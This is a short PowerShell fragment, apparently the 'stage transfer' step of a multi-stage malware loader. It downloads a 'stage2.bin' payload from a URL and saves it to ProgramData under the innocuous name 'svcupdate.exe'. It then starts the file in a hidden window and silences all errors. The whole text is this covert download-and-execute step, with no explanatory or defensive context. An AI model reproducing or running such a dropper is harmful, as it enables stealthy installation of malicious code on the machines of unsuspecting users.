
<# Stage transfer #> $RemoteUrl = 'http://localhost:9001/cdn/stage2.bin'; $OutputPath = "C:\ProgramData\svcupdate.exe"; Start-BitsTransfer -Source $RemoteUrl -Destination $OutputPath -ErrorAction SilentlyContinue; Start-Process -FilePath $OutputPath -WindowStyle Hidden -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
